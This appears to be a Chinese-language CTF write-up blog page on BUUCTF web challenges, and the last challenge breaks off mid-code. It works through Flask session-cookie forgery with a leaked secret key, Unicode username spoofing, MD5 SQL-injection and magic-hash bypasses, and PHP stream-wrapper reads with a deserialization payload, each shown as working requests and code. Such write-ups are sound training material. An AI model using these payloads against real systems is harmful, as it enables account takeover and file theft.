<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //name变量存在于session中</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //如果是admin用户,登录后会直接显示flag</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code> flask</code>的<code>session</code>是存储在客户端<code>cookie</code>中的，而且<code>flask</code>仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而<code>flask</code>并没有提供加密操作，所以其<code>session</code>的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p>
</blockquote>
<p>可以使用脚本对<code>flask</code>的<code>session</code>进行解密和伪造:</p>
<p>注册一个名为<code>admin1</code>的账户并登录,抓包看到当前的<code>cookie</code>中的<code>session</code>值:</p>
<img src="/images/buuctf-web/image-20221016213837939-166704781973463.png" alt="image-20221016213837939" style="zoom:67%;" />

<p>可以使用脚本对<code>session</code>进行解密:<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<p>用法:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py flask_session_cookie_manager3.py decode -c &quot;session值&quot; -s &quot;key值&quot;</span><br><span class="line">py flask_session_cookie_manager3.py encode -s &quot;key值&quot; -t &quot;我们需要伪造的值&quot;</span><br></pre></td></tr></table></figure>

<p>可以在<code>config.py</code>中找到<code>key</code>的值:<code>ckj123</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>用脚本: 首先使用<code>key</code>对<code>admin1</code>登录时的<code>session</code>值进行解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master&gt;py flask_session_cookie_manager3.py decode -c &quot;.eJw9kMFuwjAMhl9lypkD3egFiQNTCmqlJAKljZwLKrSQuDGT6CZoEe--DE2cP_vz__vOdsdL2zs2P9ahbyds5xs2v7O3PZszqT9RGRkAs1RpuFp03mLhAMWH4hVKUyGM5UzybrBYJmpdodAOLeUpkEiFFokYpZe6cNasgjUwSF6QNCuneJwz4ibHTdzNZ5YvZ2CqACZPJR5uYLZB6dMo3qtO0F-GolM8S8W4JdDOS2wQ9HKUVF6B8gV7TNihvxx3319de35VACqC5TZYnaWSCg8EU9Bl1G4GqbNBrGPEdaxGkeMmnq2cWi6eOk_1qX2ZmmlS2n9yrikCVjfkzwmbsJ--vTwfx5Ipe_wCfPRvAQ.Y0wFxw.Mk0P7kqa9AF6MQm6hSJpO1WQFhQ&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure>

<p>解密出来的值是一个字典: 可以看到里面有<code>admin1</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb&#x27;, &#x27;csrf_token&#x27;: b&#x27;bbed6ee196bbbf4a533d25120c50f0fa9641aea8&#x27;, &#x27;image&#x27;: b&#x27;wMTd&#x27;, &#x27;name&#x27;: &#x27;admin1&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>那么为了伪造<code>admin</code>登录,将<code>admin1</code>改为<code>admin</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb&#x27;, &#x27;csrf_token&#x27;: b&#x27;bbed6ee196bbbf4a533d25120c50f0fa9641aea8&#x27;, &#x27;image&#x27;: b&#x27;wMTd&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>然后使用脚本对修改完的内容进行加密,同样需要用到<code>key</code>,加密之后得到一个新的<code>session</code>值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master&gt;py flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb&#x27;, &#x27;csrf_token&#x27;: b&#x27;bbed6ee196bbbf4a533d25120c50f0fa9641aea8&#x27;, &#x27;image&#x27;: b&#x27;wMTd&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br><span class="line">.eJw9kMFuwjAMhl9l8pkD3egFiQNTCmqlOAKljZwLKrSQpAmT6CZoEe--DE2cP_vz__sOu-Ol7Q3Mj7Xv2wnsbAPzO7ztYQ4oP51Q6MllqZB01c5Y7QpDjn8IVjlUlaOxnCHrBu3KRKwrx6VxOuQpBZ5yyRM-okVZGK1WXisakBUB1coIFucUv-G4ibv5TLPljFTlSeUpusON1NYLeRr5e9Xx8Jeh6ATLUj5uA0lj0TWO5HLEUF4p5At4TODQX46776-uPb8qUCi8ZtprmaUYCkuBpiTLqN0MKLOBr2PEdawWInebeLYyYrl46myoT-3L1EyTUv-Tcx0igLoJ9gwT-Onby_NvkEzh8QsPi27Q.Y0wG7Q.BnqQ4DVzGAf6kiiYR_i5k9_YwLQ</span><br></pre></td></tr></table></figure>

<p>将这个新的值替换到<code>cookie</code>中,就完成了<code>session</code>伪造,成功伪装成了<code>admin</code>登录,拿到flag</p>
<img src="/images/buuctf-web/image-20221016213048788-166704781973465.png" alt="image-20221016213048788" style="zoom:67%;" />



<br>

<h2 id="另一种解法-unicode欺骗"><a href="#另一种解法-unicode欺骗" class="headerlink" title="另一种解法:unicode欺骗"></a>另一种解法:unicode欺骗</h2><p>在源码的<code>route.py</code>中可以找到网站的注册和登录逻辑:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/edit&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">error</span>):</span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlower</span>(<span class="params">username</span>):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>

<p>注意到,<code>register</code>,<code>login</code>和<code>change</code>函数中都用到了最下面定义的<code>strlower</code>函数,用来将<code>username</code>的值转化为小写</p>
<p>如果注册的时候用户名使用<code>ADMIN</code>,那么在注册完成时就会被转化成<code>admin</code></p>
<p>但是<code>nodeprep.prepare</code>在处理<code>ᴬ</code>这种特殊字符时,会将其转化为大写字母,也就是<code>A</code></p>
<p>因此,在注册是可以使用<code>ᴬdmin</code>这个用户名,在注册成功时,这个用户名被转化为了<code>Admin</code>,这样就和原有的<code>admin</code>有了区别,从而能够成功注册, 同时,在使用<code>Admin</code>登录时还会调用一次<code>nodeprep.prepare</code>函数, 因此登录进去的时候就变成了<code>admin</code>,从而拿到flag</p>
<img src="/images/buuctf-web/image-20221016220028090-166704781973567.png" alt="image-20221016220028090" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>抓包之后看到了提示:</p>
<img src="/images/buuctf-web/image-20221016221105336-166704781973566.png" alt="image-20221016221105336" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)//这里参数true的意思是输出格式为二进制格式</span><br></pre></td></tr></table></figure>

<p>传进去的参数被计算了md5值,那么需要被计算md5后还能达到注入效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure>

<p>这两个值在生成二进制的<code>md5</code>后可以包含<code>...&#39; or .. </code>这样的<strong>万能密码</strong></p>
<p>用上面这个个值登录进去后,查看源码可以看到下一条提示:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<h2 id="数组绕过md5"><a href="#数组绕过md5" class="headerlink" title="数组绕过md5"></a>数组绕过md5</h2><p>这里需要a和b的值不相等,但是<code>md5</code>计算结果相等,<strong>这里传数组就可以,php中数组经过md5计算的值为<code>NULL</code></strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/levels91.php?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>

<p>然后来到了下一个提示: 和刚才如出一辙,还是传数组就可以:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221016222416913-166704781973568.png" alt="image-20221016222416913" style="zoom:67%;" />



<h2 id="0e绕过md5"><a href="#0e绕过md5" class="headerlink" title="0e绕过md5"></a>0e绕过md5</h2><p>另外一种方法: </p>
<p><code>0e</code>开头的字符串在参与比较时,<strong>会被当做科学计数法</strong>,结果转换为0,因此,下面两个数的比较:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0e830400451993494058024219903391 == 0e462097431906509019562988736854</span><br><span class="line">会被视为:</span><br><span class="line">0==0 从而返回True</span><br></pre></td></tr></table></figure>

<p>那么这种方法也可以用来绕过<code>md5</code>值的比较:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708) 这两者计算md5的结果都是0e开头的,所以这里会判定为True</span><br></pre></td></tr></table></figure>

<p><code>md5</code>计算后以<code>0e</code>开头的值还包括:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">byGcY</span><br><span class="line">sonZ7y</span><br><span class="line">aabg7XSs</span><br><span class="line">aabC9RqS</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s1091221200a</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>伪协议+反序列化</p>
<p>这题直接给源码了:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>第一步,需要让<code>text</code>参数的值等于某个文件名,然后从该文件中还要读取到”welcome to the zjctf”</p>
<p>这里可以使用<code>data</code>伪协议(通常用来执行代码): <strong>相当于让<code>file_get_contents</code>从<code>data</code>的流中读取数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0e27bf5-f2af-4d14-8542-148fd03d2e29.node4.buuoj.cn:81/index.php?text=data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221016230039673-166704781973569.png" alt="image-20221016230039673" style="zoom:67%;" />



<p>接下来需要给<code>file</code>传值,先用<code>php</code>伪协议来读一下提示里<code>useless.php</code>的源码试试:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>

<p>把输出的内容解码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>结合前面的代码,<code>password</code>的值会被反序列化,生成一个这里<code>Flag</code>类的实例. 而前面<code>echo $password</code>时,则会触发这里的<code>__tostring</code>魔术方法, 根据参数<code>file</code>的值去读文件,那么显然可以将它的值设为<code>flag.php</code></p>
<p>所以现在在本地创建一个<code>Flag</code>类的实例,并将其<code>file</code>属性赋值为<code>flag.php</code>,最后将其序列化:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span 